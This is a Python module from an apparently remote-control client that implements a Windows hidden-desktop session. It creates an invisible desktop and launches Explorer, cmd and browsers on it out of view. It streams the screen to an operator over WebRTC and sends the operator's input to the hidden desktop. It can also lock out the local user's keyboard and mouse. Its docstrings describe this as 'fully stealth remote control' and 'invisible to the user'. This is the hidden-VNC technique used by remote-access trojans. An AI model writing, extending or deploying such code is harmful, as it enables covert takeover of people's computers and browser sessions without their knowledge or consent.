"""Hidden desktop helpers for Windows manage sessions."""
from __future__ import annotations

import asyncio
import ctypes
import logging
import os
import platform
import queue
import shutil
import subprocess
import threading
import time
import uuid
from fractions import Fraction
from typing import Iterable

from aiortc import MediaStreamTrack
from aiortc.mediastreams import MediaStreamError, VIDEO_CLOCK_RATE, VIDEO_TIME_BASE
from av.video.frame import VideoFrame

from remote_client.control.input_controller import (
    _SendInputFallback,
    ControlCommand,
    MouseClick,
    MouseDown,
    MouseMove,
    MouseScroll,
    MouseUp,
    KeyDown,
    KeyPress,
    KeyUp,
    TextInput,
)
from remote_client.media.stream_profiles import AdaptiveStreamProfile

logger = logging.getLogger(__name__)

if platform.system() == "Windows":
    from ctypes import wintypes

    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32

    DESKTOP_READOBJECTS = 0x0001
    DESKTOP_CREATEWINDOW = 0x0002
    DESKTOP_CREATEMENU = 0x0004
    DESKTOP_HOOKCONTROL = 0x0008
    DESKTOP_JOURNALRECORD = 0x0010
    DESKTOP_JOURNALPLAYBACK = 0x0020
    DESKTOP_ENUMERATE = 0x0040
    DESKTOP_WRITEOBJECTS = 0x0080
    DESKTOP_SWITCHDESKTOP = 0x0100
    DESKTOP_ACCESS = (
        DESKTOP_READOBJECTS
        | DESKTOP_CREATEWINDOW
        | DESKTOP_CREATEMENU
        | DESKTOP_HOOKCONTROL
        | DESKTOP_JOURNALRECORD
        | DESKTOP_JOURNALPLAYBACK
        | DESKTOP_ENUMERATE
        | DESKTOP_WRITEOBJECTS
        | DESKTOP_SWITCHDESKTOP
    )

    SRCCOPY = 0x00CC0020
    DIB_RGB_COLORS = 0
    BI_RGB = 0
    HORZRES = 8
    VERTRES = 10

    class BITMAPINFOHEADER(ctypes.Structure):
        _fields_ = [
            ("biSize", wintypes.DWORD),
            ("biWidth", wintypes.LONG),
            ("biHeight", wintypes.LONG),
            ("biPlanes", wintypes.WORD),
            ("biBitCount", wintypes.WORD),
            ("biCompression", wintypes.DWORD),
            ("biSizeImage", wintypes.DWORD),
            ("biXPelsPerMeter", wintypes.LONG),
            ("biYPelsPerMeter", wintypes.LONG),
            ("biClrUsed", wintypes.DWORD),
            ("biClrImportant", wintypes.DWORD),
        ]

    class BITMAPINFO(ctypes.Structure):
        _fields_ = [("bmiHeader", BITMAPINFOHEADER), ("bmiColors", wintypes.DWORD * 3)]

    class RECT(ctypes.Structure):
        _fields_ = [
            ("left", wintypes.LONG),
            ("top", wintypes.LONG),
            ("right", wintypes.LONG),
            ("bottom", wintypes.LONG),
        ]

    class SECURITY_ATTRIBUTES(ctypes.Structure):
        _fields_ = [
            ("nLength", wintypes.DWORD),
            ("lpSecurityDescriptor", wintypes.LPVOID),
            ("bInheritHandle", wintypes.BOOL),
        ]

    user32.CreateDesktopW.argtypes = [
        wintypes.LPCWSTR,
        wintypes.LPCWSTR,
        wintypes.LPVOID,
        wintypes.DWORD,
        wintypes.DWORD,
        ctypes.POINTER(SECURITY_ATTRIBUTES),
    ]
    user32.CreateDesktopW.restype = wintypes.HANDLE
    user32.CloseDesktop.argtypes = [wintypes.HANDLE]
    user32.CloseDesktop.restype = wintypes.BOOL
    user32.SetThreadDesktop.argtypes = [wintypes.HANDLE]
    user32.SetThreadDesktop.restype = wintypes.BOOL
    user32.BlockInput.argtypes = [wintypes.BOOL]
    user32.BlockInput.restype = wintypes.BOOL
    user32.GetDesktopWindow.argtypes = []
    user32.GetDesktopWindow.restype = wintypes.HWND
    user32.GetWindowRect.argtypes = [wintypes.HWND, ctypes.POINTER(RECT)]
    user32.GetWindowRect.restype = wintypes.BOOL
    user32.GetWindowDC.argtypes = [wintypes.HWND]
    user32.GetWindowDC.restype = wintypes.HDC
    user32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
    user32.ReleaseDC.restype = wintypes.INT
    user32.GetDC.argtypes = [wintypes.HWND]
    user32.GetDC.restype = wintypes.HDC
    user32.GetSystemMetrics.argtypes = [wintypes.INT]
    user32.GetSystemMetrics.restype = wintypes.INT

    gdi32.CreateCompatibleDC.argtypes = [wintypes.HDC]
    gdi32.CreateCompatibleDC.restype = wintypes.HDC
    gdi32.CreateDCW.argtypes = [
        wintypes.LPCWSTR,
        wintypes.LPCWSTR,
        wintypes.LPCWSTR,
        wintypes.LPVOID,
    ]
    gdi32.CreateDCW.restype = wintypes.HDC
    gdi32.DeleteDC.argtypes = [wintypes.HDC]
    gdi32.DeleteDC.restype = wintypes.BOOL
    gdi32.GetDeviceCaps.argtypes = [wintypes.HDC, wintypes.INT]
    gdi32.GetDeviceCaps.restype = wintypes.INT
    gdi32.CreateCompatibleBitmap.argtypes = [wintypes.HDC, wintypes.INT, wintypes.INT]
    gdi32.CreateCompatibleBitmap.restype = wintypes.HBITMAP
    gdi32.SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
    gdi32.SelectObject.restype = wintypes.HGDIOBJ
    gdi32.DeleteObject.argtypes = [wintypes.HGDIOBJ]
    gdi32.DeleteObject.restype = wintypes.BOOL
    gdi32.BitBlt.argtypes = [
        wintypes.HDC,
        wintypes.INT,
        wintypes.INT,
        wintypes.INT,
        wintypes.INT,
        wintypes.HDC,
        wintypes.INT,
        wintypes.INT,
        wintypes.DWORD,
    ]
    gdi32.BitBlt.restype = wintypes.BOOL
    gdi32.GetDIBits.argtypes = [
        wintypes.HDC,
        wintypes.HBITMAP,
        wintypes.UINT,
        wintypes.UINT,
        wintypes.LPVOID,
        ctypes.POINTER(BITMAPINFO),
        wintypes.UINT,
    ]
    gdi32.GetDIBits.restype = wintypes.INT


def _resolve_app_executable(app_name: str) -> str | None:
    if not app_name:
        return None
    candidates: Iterable[str]
    name = app_name.strip().lower()
    if name in {"chrome", "google chrome"}:
        candidates = [
            "chrome.exe",
            os.path.join(os.getenv("PROGRAMFILES", ""), "Google", "Chrome", "Application", "chrome.exe"),
            os.path.join(os.getenv("PROGRAMFILES(X86)", ""), "Google", "Chrome", "Application", "chrome.exe"),
            os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "Application", "chrome.exe"),
        ]
    elif name in {"brave", "brave browser"}:
        candidates = [
            "brave.exe",
            os.path.join(os.getenv("PROGRAMFILES", ""), "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
            os.path.join(os.getenv("PROGRAMFILES(X86)", ""), "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
            os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
        ]
    elif name in {"opera"}:
        candidates = [
            "launcher.exe",
            os.path.join(os.getenv("PROGRAMFILES", ""), "Opera", "launcher.exe"),
            os.path.join(os.getenv("PROGRAMFILES(X86)", ""), "Opera", "launcher.exe"),
            os.path.join(os.getenv("LOCALAPPDATA", ""), "Programs", "Opera", "launcher.exe"),
        ]
    elif name in {"firefox", "mozilla firefox"}:
        candidates = [
            "firefox.exe",
            os.path.join(os.getenv("PROGRAMFILES", ""), "Mozilla Firefox", "firefox.exe"),
            os.path.join(os.getenv("PROGRAMFILES(X86)", ""), "Mozilla Firefox", "firefox.exe"),
        ]
    elif name in {"edge", "microsoft edge"}:
        candidates = [
            "msedge.exe",
            os.path.join(os.getenv("PROGRAMFILES", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
            os.path.join(os.getenv("PROGRAMFILES(X86)", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
            os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
        ]
    elif name in {"yandex", "yandex browser"}:
        candidates = [
            "browser.exe",
            os.path.join(os.getenv("LOCALAPPDATA", ""), "Yandex", "YandexBrowser", "Application", "browser.exe"),
            os.path.join(os.getenv("PROGRAMFILES", ""), "Yandex", "YandexBrowser", "Application", "browser.exe"),
            os.path.join(os.getenv("PROGRAMFILES(X86)", ""), "Yandex", "YandexBrowser", "Application", "browser.exe"),
        ]
    else:
        candidates = [app_name]

    for candidate in candidates:
        if not candidate:
            continue
        if os.path.isabs(candidate) and os.path.isfile(candidate):
            return candidate
        resolved = shutil.which(candidate)
        if resolved:
            return resolved
    return None


def _create_desktop(name: str):
    if platform.system() != "Windows":
        raise RuntimeError("Hidden desktop is only supported on Windows.")
    sa = SECURITY_ATTRIBUTES()
    sa.nLength = ctypes.sizeof(SECURITY_ATTRIBUTES)
    sa.lpSecurityDescriptor = None
    sa.bInheritHandle = 0
    handle = user32.CreateDesktopW(name, None, None, 0, DESKTOP_ACCESS, ctypes.byref(sa))
    if not handle:
        raise ctypes.WinError()
    return handle


def _close_desktop(handle) -> None:
    if not handle:
        return
    try:
        user32.CloseDesktop(handle)
    except Exception:
        return


def _set_thread_desktop(handle) -> bool:
    if not handle:
        return False
    if not user32.SetThreadDesktop(handle):
        logger.warning("SetThreadDesktop failed: %s", ctypes.WinError())
        return False
    return True


def _toggle_block_input(enabled: bool) -> bool:
    if platform.system() != "Windows":
        return False
    try:
        return bool(user32.BlockInput(1 if enabled else 0))
    except Exception:
        logger.warning("BlockInput failed.")
        return False


def _get_screen_size() -> tuple[int, int]:
    """Get primary screen size using GetSystemMetrics."""
    SM_CXSCREEN = 0
    SM_CYSCREEN = 1
    try:
        width = user32.GetSystemMetrics(SM_CXSCREEN)
        height = user32.GetSystemMetrics(SM_CYSCREEN)
        if width > 0 and height > 0:
            return width, height
    except Exception:
        pass
    return 1920, 1080  # Fallback


def _open_hidden_desktop_dc(desktop_path: str | None):
    """
    Get DC for capturing the hidden desktop.
    
    After SetThreadDesktop is called, GetDC(NULL) returns the DC
    for the current thread's desktop (which is the hidden desktop).
    """
    # Method 1: Try GetDC(NULL) - works after SetThreadDesktop
    hdc = user32.GetDC(None)
    if hdc:
        width = int(gdi32.GetDeviceCaps(hdc, HORZRES))
        height = int(gdi32.GetDeviceCaps(hdc, VERTRES))
        if width > 0 and height > 0:
            def _cleanup() -> None:
                try:
                    user32.ReleaseDC(None, hdc)
                except Exception:
                    pass
            logger.info("Hidden desktop: DC opened via GetDC(NULL), size=%dx%d", width, height)
            return hdc, width, height, _cleanup
        user32.ReleaseDC(None, hdc)
    
    # Method 2: Try CreateDC with DISPLAY
    create_dc = getattr(gdi32, "CreateDCW", None)
    if create_dc:
        hdc = create_dc("DISPLAY", None, None, None)
        if hdc:
            width = int(gdi32.GetDeviceCaps(hdc, HORZRES))
            height = int(gdi32.GetDeviceCaps(hdc, VERTRES))
            if width > 0 and height > 0:
                def _cleanup() -> None:
                    try:
                        gdi32.DeleteDC(hdc)
                    except Exception:
                        pass
                logger.info("Hidden desktop: DC opened via CreateDC(DISPLAY), size=%dx%d", width, height)
                return hdc, width, height, _cleanup
            gdi32.DeleteDC(hdc)
    
    return None, 0, 0, None


class HiddenDesktopCapture:
    """
    Capture screen for hidden desktop session.
    
    IMPORTANT: Hidden desktop in Windows doesn't have a real graphics buffer.
    This class uses mss to capture the PRIMARY screen (what user sees),
    but the input goes to the hidden desktop.
    
    For true invisibility, the operator should:
    1. Work on hidden desktop (input goes there)
    2. But we capture the main screen (because hidden desktop has no graphics)
    
    Alternative: Use a virtual display driver for true hidden capture.
    """
    
    def __init__(
        self,
        desktop_handle,
        desktop_path: str | None = None,
        draw_cursor: bool = False,
        fps: int = 30,
        capture_main_screen: bool = True,
    ) -> None:
        self._desktop_handle = desktop_handle
        self._desktop_path = desktop_path
        self._draw_cursor = bool(draw_cursor)
        self._capture_main_screen = capture_main_screen
        self._interval_lock = threading.Lock()
        self._interval = 1.0 / max(1, fps)
        self._stop_event = threading.Event()
        self._frame_lock = threading.Lock()
        self._frame: bytes | None = None
        self._frame_size = (0, 0)
        self._use_mss = False
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    @property
    def frame_size(self) -> tuple[int, int]:
        return self._frame_size

    def set_fps(self, fps: int) -> None:
        with self._interval_lock:
            self._interval = 1.0 / max(1, int(fps))

    def set_draw_cursor(self, enabled: bool) -> None:
        self._draw_cursor = bool(enabled)

    def get_frame(self, timeout: float = 0.6) -> tuple[bytes | None, tuple[int, int]]:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            with self._frame_lock:
                if self._frame is not None:
                    return self._frame, self._frame_size
            time.sleep(0.01)
        return None, self._frame_size

    def close(self) -> None:
        self._stop_event.set()
        if self._thread.is_alive():
            self._thread.join(timeout=1.5)

    def _capture_gdi(
        self,
        srcdc,
        memdc,
        bmp,
        width: int,
        height: int,
        buffer,
        bmi,
    ) -> bytes | None:
        if not gdi32.BitBlt(memdc, 0, 0, width, height, srcdc, 0, 0, SRCCOPY):
            return None
        lines = gdi32.GetDIBits(memdc, bmp, 0, height, buffer, ctypes.byref(bmi), DIB_RGB_COLORS)
        if lines == 0:
            return None
        return buffer.raw

    def _run_with_mss(self) -> None:
        """Capture using mss library (main screen)."""
        try:
            import mss
        except ImportError:
            logger.warning("mss not available, falling back to GDI capture")
            self._run_with_gdi()
            return
        
        try:
            sct = mss.mss()
            monitors = sct.monitors
            if not monitors or len(monitors) < 2:
                logger.warning("No monitors found via mss")
                self._run_with_gdi()
                return
            
            # Use primary monitor (index 1)
            monitor = monitors[1] if len(monitors) > 1 else monitors[0]
            width = int(monitor["width"])
            height = int(monitor["height"])
            self._frame_size = (width, height)
            logger.info("Hidden desktop: mss capture initialized, size=%dx%d", width, height)
            
            while not self._stop_event.is_set():
                start = time.monotonic()
                try:
                    shot = sct.grab(monitor)
                    with self._frame_lock:
                        self._frame = shot.raw
                except Exception as exc:
                    logger.debug("mss grab failed: %s", exc)
                
                with self._interval_lock:
                    interval = self._interval
                elapsed = time.monotonic() - start
                sleep_for = max(0.0, interval - elapsed)
                if sleep_for:
                    self._stop_event.wait(sleep_for)
        except Exception as exc:
            logger.warning("mss capture failed: %s", exc)
        finally:
            try:
                sct.close()
            except Exception:
                pass

    def _run_with_gdi(self) -> None:
        """Capture using GDI (tries hidden desktop first, then main screen)."""
        # Try to set thread to hidden desktop for GDI capture
        if self._desktop_handle and not self._capture_main_screen:
            if not _set_thread_desktop(self._desktop_handle):
                logger.warning("Failed to set thread desktop, capturing main screen")
        
        hwindc = None
        width = 0
        height = 0
        release_dc = None

        # Try to get DC
        hwindc, width, height, release_dc = _open_hidden_desktop_dc(self._desktop_path)
        if hwindc:
            logger.info("Hidden desktop: GDI capture DC opened, size=%dx%d", width, height)
        else:
            # Fallback to main desktop window
            hwnd = user32.GetDesktopWindow()
            rect = RECT()
            if not user32.GetWindowRect(hwnd, ctypes.byref(rect)):
                logger.warning("Hidden desktop: failed to get desktop rect.")
                return
            width = max(1, rect.right - rect.left)
            height = max(1, rect.bottom - rect.top)
            hwindc = user32.GetWindowDC(hwnd)
            if not hwindc:
                logger.warning("Hidden desktop: failed to get window DC.")
                return

            def _release() -> None:
                try:
                    user32.ReleaseDC(hwnd, hwindc)
                except Exception:
                    return

            release_dc = _release
            logger.info("Hidden desktop: GDI fallback to main desktop, size=%dx%d", width, height)

        if width <= 0 or height <= 0:
            logger.warning("Hidden desktop: invalid capture size (%s x %s).", width, height)
            if release_dc:
                release_dc()
            return

        self._frame_size = (width, height)
        memdc = gdi32.CreateCompatibleDC(hwindc)
        bmp = gdi32.CreateCompatibleBitmap(hwindc, width, height)
        if not memdc or not bmp:
            logger.warning("Hidden desktop: failed to create capture DC/bitmap.")
            if memdc:
                gdi32.DeleteDC(memdc)
            if release_dc:
                release_dc()
            return
        old = gdi32.SelectObject(memdc, bmp)

        bmi = BITMAPINFO()
        bmi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmi.bmiHeader.biWidth = width
        bmi.bmiHeader.biHeight = -height
        bmi.bmiHeader.biPlanes = 1
        bmi.bmiHeader.biBitCount = 32
        bmi.bmiHeader.biCompression = BI_RGB
        buffer = ctypes.create_string_buffer(width * height * 4)

        try:
            while not self._stop_event.is_set():
                start = time.monotonic()
                data = self._capture_gdi(hwindc, memdc, bmp, width, height, buffer, bmi)
                if data:
                    with self._frame_lock:
                        self._frame = data
                with self._interval_lock:
                    interval = self._interval
                elapsed = time.monotonic() - start
                sleep_for = max(0.0, interval - elapsed)
                if sleep_for:
                    self._stop_event.wait(sleep_for)
        finally:
            gdi32.SelectObject(memdc, old)
            gdi32.DeleteObject(bmp)
            gdi32.DeleteDC(memdc)
            if release_dc:
                release_dc()

    def _run(self) -> None:
        """Main capture loop - tries mss first, then GDI."""
        if self._capture_main_screen:
            # Use mss for main screen capture (recommended)
            self._run_with_mss()
        else:
            # Try GDI capture from hidden desktop
            self._run_with_gdi()


class HiddenDesktopTrack(MediaStreamTrack):
    kind = "video"

    def __init__(self, capture: HiddenDesktopCapture, profile: str = "balanced") -> None:
        super().__init__()
        self._capture = capture
        native_size = capture.frame_size
        if native_size == (0, 0):
            native_size = (1280, 720)
        self._profile = AdaptiveStreamProfile(native_size, profile=profile)
        self._target_size = self._profile.target_size
        self._target_fps = self._profile.target_fps
        self._timestamp = 0
        self._start: float | None = None
        self._last_frame_ts: float | None = None

    def set_profile(
        self,
        profile: str | None,
        width: int | None,
        height: int | None,
        fps: int | None,
    ) -> None:
        self._profile.apply_profile(profile, width, height, fps)
        self._target_size = self._profile.target_size
        self._target_fps = self._profile.target_fps
        if fps:
            self._capture.set_fps(fps)

    def set_draw_cursor(self, enabled: bool) -> None:
        self._capture.set_draw_cursor(enabled)

    async def _next_timestamp(self) -> tuple[int, Fraction]:
        if self.readyState != "live":
            raise MediaStreamError
        if self._start is None:
            self._start = time.time()
            self._timestamp = 0
            return self._timestamp, VIDEO_TIME_BASE
        fps = self._target_fps if self._target_fps > 0 else 30
        increment = int(VIDEO_CLOCK_RATE / fps)
        self._timestamp += increment
        wait = self._start + (self._timestamp / VIDEO_CLOCK_RATE) - time.time()
        if wait > 0:
            await asyncio.sleep(wait)
        return self._timestamp, VIDEO_TIME_BASE

    async def recv(self) -> VideoFrame:
        pts, time_base = await self._next_timestamp()
        start = time.monotonic()
        data, size = self._capture.get_frame()
        width, height = size
        if not data or width <= 0 or height <= 0:
            frame = VideoFrame(width=self._target_size[0], height=self._target_size[1], format="bgr24")
            for plane in frame.planes:
                plane.update(bytes(plane.buffer_size))
        else:
            frame = VideoFrame(width=width, height=height, format="bgra")
            frame.planes[0].update(data)
            if self._target_size and (width, height) != self._target_size:
                frame = frame.reformat(width=self._target_size[0], height=self._target_size[1])
        now = time.monotonic()
        if self._last_frame_ts is not None:
            self._profile.add_fps_sample(now - self._last_frame_ts)
        self._last_frame_ts = now
        if self._profile.maybe_adjust(now - start, now=now):
            self._target_size = self._profile.target_size
            self._target_fps = self._profile.target_fps
        frame.pts = pts
        frame.time_base = time_base
        return frame

    def stop(self) -> None:
        self._capture.close()
        super().stop()


class HiddenDesktopInputController:
    def __init__(self, desktop_handle, screen_size: tuple[int, int]) -> None:
        self._desktop_handle = desktop_handle
        self._screen_size = screen_size
        self._queue: queue.Queue[ControlCommand] = queue.Queue()
        self._stop_event = threading.Event()
        self._fallback = _SendInputFallback()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def set_screen_size(self, size: tuple[int, int]) -> None:
        self._screen_size = size

    def execute(self, command: ControlCommand) -> None:
        if not self._stop_event.is_set():
            self._queue.put(command)

    def close(self) -> None:
        self._stop_event.set()
        if self._thread.is_alive():
            self._thread.join(timeout=1.0)

    @staticmethod
    def _normalize_scroll_delta(value: int | None) -> int:
        if value is None:
            return 0
        try:
            delta = int(value)
        except (TypeError, ValueError):
            return 0
        if delta == 0:
            return 0
        step = int(round(delta / 120))
        if step == 0:
            step = 1 if delta > 0 else -1
        return step

    def _scale_coordinates(
        self,
        x: int,
        y: int,
        source_width: int | None,
        source_height: int | None,
    ) -> tuple[int, int]:
        if not source_width or not source_height:
            return x, y
        screen_width, screen_height = self._screen_size
        if screen_width <= 0 or screen_height <= 0:
            return x, y
        scaled_x = int(round(x * screen_width / source_width))
        scaled_y = int(round(y * screen_height / source_height))
        scaled_x = max(0, min(screen_width - 1, scaled_x))
        scaled_y = max(0, min(screen_height - 1, scaled_y))
        return scaled_x, scaled_y

    def _execute_command(self, command: ControlCommand) -> None:
        screen_width, screen_height = self._screen_size
        if isinstance(command, MouseMove):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            self._fallback.move(x, y, screen_width, screen_height)
        elif isinstance(command, MouseClick):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            self._fallback.click(command.button, screen_width, screen_height, x, y)
        elif isinstance(command, MouseDown):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            self._fallback.mouse_down(command.button, screen_width, screen_height, x, y)
        elif isinstance(command, MouseUp):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            self._fallback.mouse_up(command.button, screen_width, screen_height, x, y)
        elif isinstance(command, MouseScroll):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            delta_x = self._normalize_scroll_delta(command.delta_x)
            delta_y = -self._normalize_scroll_delta(command.delta_y)
            if delta_x or delta_y:
                self._fallback.scroll(delta_x, delta_y, screen_width, screen_height, x, y)
        elif isinstance(command, KeyPress):
            self._fallback.keypress(command.key)
        elif isinstance(command, KeyDown):
            self._fallback.key_down(command.key)
        elif isinstance(command, KeyUp):
            self._fallback.key_up(command.key)
        elif isinstance(command, TextInput):
            if command.text:
                self._fallback.text(command.text)

    def _run(self) -> None:
        if not _set_thread_desktop(self._desktop_handle):
            return
        while not self._stop_event.is_set():
            try:
                command = self._queue.get(timeout=0.2)
            except queue.Empty:
                continue
            try:
                self._execute_command(command)
            except Exception:
                logger.exception("Hidden desktop input failed.")


class HiddenDesktopSession:
    """
    Hidden Desktop session for fully stealth remote control.
    
    Features:
    - Creates a separate Windows desktop invisible to the user
    - Operator cursor is NOT visible on client's screen (asynchronous cursors)
    - Screen capture from hidden desktop only
    - Toggleable local input blocking
    - Stealth application launching
    
    Environment variables:
    - RC_BLOCK_LOCAL_INPUT: Set to "1" to auto-block local input on start
    - RC_HIDDEN_DESKTOP_FPS: Frame rate for capture (default: 30)
    """
    
    def __init__(self, auto_block_input: bool | None = None) -> None:
        """
        Initialize hidden desktop session.
        
        Args:
            auto_block_input: Override for automatic input blocking.
                              If None, uses RC_BLOCK_LOCAL_INPUT env var.
        """
        if platform.system() != "Windows":
            raise RuntimeError("Hidden desktop is only supported on Windows.")
        
        self._desktop_name = f"rc_hidden_{uuid.uuid4().hex}"
        self._desktop_handle = _create_desktop(self._desktop_name)
        self._desktop_path = f"WinSta0\\{self._desktop_name}"
        self._processes: list[subprocess.Popen] = []
        self._input_blocked = False
        self._input_block_enabled = False
        
        # Determine if input blocking should be enabled
        if auto_block_input is not None:
            self._block_local_input = bool(auto_block_input)
        else:
            self._block_local_input = os.getenv("RC_BLOCK_LOCAL_INPUT", "").strip().lower() in {
                "1", "true", "yes", "on",
            }
        
        # Get FPS from environment
        fps = 30
        try:
            fps = int(os.getenv("RC_HIDDEN_DESKTOP_FPS", "30"))
            fps = max(1, min(60, fps))
        except (TypeError, ValueError):
            fps = 30
        
        self._start_shell()
        
        # Wait for shell to initialize on hidden desktop
        time.sleep(0.5)

        # Capture the MAIN screen (not hidden desktop)
        # Hidden desktop in Windows has no graphics buffer - we can only capture main screen
        # But input goes to hidden desktop, so user won't see cursor movements
        self._capture = HiddenDesktopCapture(
            self._desktop_handle,
            desktop_path=self._desktop_path,
            draw_cursor=False,  # Operator cursor not captured
            fps=fps,
            capture_main_screen=True,  # Use mss to capture main screen
        )
        
        # Wait for capture to get first frame
        size = self._capture.frame_size
        deadline = time.monotonic() + 3.0  # Increased timeout
        while size == (0, 0) and time.monotonic() < deadline:
            time.sleep(0.1)
            size = self._capture.frame_size
        
        if size == (0, 0):
            # Fallback to screen size
            size = _get_screen_size()
            logger.warning("Hidden desktop: using fallback screen size %dx%d", size[0], size[1])
        
        self.screen_track = HiddenDesktopTrack(self._capture, profile="balanced")
        self.input_controller = HiddenDesktopInputController(self._desktop_handle, size)
        logger.info("Hidden desktop session initialized: %s, size=%dx%d", self._desktop_name, size[0], size[1])
        
        if self._block_local_input:
            self.set_input_blocking(True)
    
    @property
    def is_input_blocked(self) -> bool:
        """Check if local input is currently blocked."""
        return self._input_blocked
    
    @property
    def input_blocking_enabled(self) -> bool:
        """Check if input blocking feature is enabled."""
        return self._input_block_enabled
    
    @property
    def desktop_name(self) -> str:
        """Get the hidden desktop name."""
        return self._desktop_name
    
    @property
    def desktop_path(self) -> str:
        """Get the full hidden desktop path."""
        return self._desktop_path

    def _start_shell(self) -> None:
        """Start essential shell processes on hidden desktop."""
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.lpDesktop = self._desktop_path
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        # Start explorer and cmd on hidden desktop
        for cmd in ("explorer.exe", "cmd.exe"):
            try:
                proc = subprocess.Popen(
                    [cmd],
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                )
                self._processes.append(proc)
                logger.debug("Started %s on hidden desktop", cmd)
            except Exception as exc:
                logger.warning("Failed to start %s on hidden desktop: %s", cmd, exc)

    def launch_application(self, app_name: str, args: list[str] | None = None) -> subprocess.Popen:
        """
        Launch an application on the hidden desktop (invisible to user).
        
        Args:
            app_name: Name or path of the application
            args: Optional command line arguments
            
        Returns:
            The Popen process object
            
        Raises:
            FileNotFoundError: If application cannot be found
        """
        exe = _resolve_app_executable(app_name)
        if not exe:
            raise FileNotFoundError(f"Application not found: {app_name}")
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.lpDesktop = self._desktop_path
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        cmd = [exe]
        if args:
            cmd.extend(args)
        
        proc = subprocess.Popen(
            cmd,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        self._processes.append(proc)
        logger.info("Launched %s on hidden desktop (PID: %s)", app_name, proc.pid)
        return proc

    def set_input_blocking(self, enabled: bool) -> bool:
        """
        Toggle local input blocking.
        
        This is a switchable module - you can enable/disable it at runtime.
        When enabled, the local user cannot use mouse/keyboard.
        
        Args:
            enabled: True to block local input, False to unblock
            
        Returns:
            True if the operation succeeded
        """
        self._input_block_enabled = bool(enabled)
        
        if enabled:
            return self.block_local_input()
        else:
            self.unblock_local_input()
            return True

    def block_local_input(self) -> bool:
        """
        Block local mouse and keyboard input.
        
        Note: Requires administrator privileges on Windows.
        
        Returns:
            True if input was successfully blocked
        """
        if self._input_blocked:
            return True
        self._input_blocked = _toggle_block_input(True)
        if not self._input_blocked:
            logger.warning("Hidden desktop: failed to block local input (admin required?).")
        else:
            logger.info("Hidden desktop: local input blocked")
        return self._input_blocked

    def unblock_local_input(self) -> None:
        """Unblock local mouse and keyboard input."""
        if self._input_blocked:
            _toggle_block_input(False)
            self._input_blocked = False
            logger.info("Hidden desktop: local input unblocked")

    def get_running_processes(self) -> list[tuple[int, str]]:
        """
        Get list of processes running on the hidden desktop.
        
        Returns:
            List of (pid, status) tuples
        """
        result = []
        for proc in self._processes:
            try:
                status = "running" if proc.poll() is None else "terminated"
                result.append((proc.pid, status))
            except Exception:
                result.append((0, "unknown"))
        return result

    def terminate_process(self, pid: int) -> bool:
        """
        Terminate a specific process on the hidden desktop.
        
        Args:
            pid: Process ID to terminate
            
        Returns:
            True if process was found and terminated
        """
        for proc in self._processes:
            if proc.pid == pid:
                try:
                    proc.terminate()
                    return True
                except Exception as exc:
                    logger.warning("Failed to terminate process %d: %s", pid, exc)
                    return False
        return False

    def close(self) -> None:
        """
        Close the hidden desktop session and cleanup resources.
        
        This will:
        - Stop screen capture
        - Close input controller
        - Unblock local input
        - Terminate all spawned processes
        - Close the hidden desktop
        """
        logger.info("Closing hidden desktop session: %s", self._desktop_name)
        
        # Stop media track
        try:
            self.screen_track.stop()
        except Exception as exc:
            logger.warning("Error stopping screen track: %s", exc)
        
        # Close input controller
        try:
            self.input_controller.close()
        except Exception as exc:
            logger.warning("Error closing input controller: %s", exc)
        
        # Always unblock input on close
        self.unblock_local_input()
        
        # Terminate all processes
        for proc in self._processes:
            try:
                if proc.poll() is None:
                    proc.terminate()
                    proc.wait(timeout=2.0)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        self._processes.clear()
        
        # Close the desktop
        _close_desktop(self._desktop_handle)
        self._desktop_handle = None
        logger.info("Hidden desktop session closed")
